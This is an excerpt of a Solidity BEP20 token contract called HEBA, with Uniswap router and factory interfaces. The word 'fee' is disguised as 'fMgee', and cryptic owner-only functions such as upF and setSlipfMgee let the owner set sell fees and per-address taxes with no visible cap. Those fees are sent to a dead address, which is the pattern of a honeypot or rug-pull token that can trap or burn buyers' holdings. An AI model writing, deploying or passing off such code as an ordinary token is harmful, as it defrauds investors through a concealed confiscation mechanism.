...
interface IUniswapV2Factory {
    ...
    function fMgeeTo() external view returns (address);
    function fMgeeToSetter() external view returns (address);
    ...
    function setfMgeeTo(address) external;
    function setfMgeeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfMgeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfMgeeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfMgeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfMgeeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfMgeeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract HEBA is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellfMgee = 0;

    uint256 private _defaultBuyfMgee = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfMgee;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfMgee = _value;
    }

    function setSlipfMgee(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfMgee[_address] = _value;
    }

    function getSlipfMgee(address _address) external view onlyownar returns (uint256) {
        return _slipfMgee[_address];
    }


    function setMAccountfMgee(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfMgee(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefMgeeAmount = 0;

        if (rF) {
            uint256 tradefMgee = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefMgee = _defaultSellfMgee;
                }
                if (from == uniswapV2Pair) {

                    tradefMgee = _defaultBuyfMgee;
                }
            }
            if (_slipfMgee[from] > 0) {
                tradefMgee = _slipfMgee[from];
            }

            tradefMgeeAmount = _Amount.mul(tradefMgee).div(100);
        }


        if (tradefMgeeAmount > 0) {
            _balances[from] = _balances[from].sub(tradefMgeeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefMgeeAmount);
            emit Transfer(from, _deadAddress, tradefMgeeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefMgeeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefMgeeAmount);
        emit Transfer(from, _to, _Amount - tradefMgeeAmount);
    }
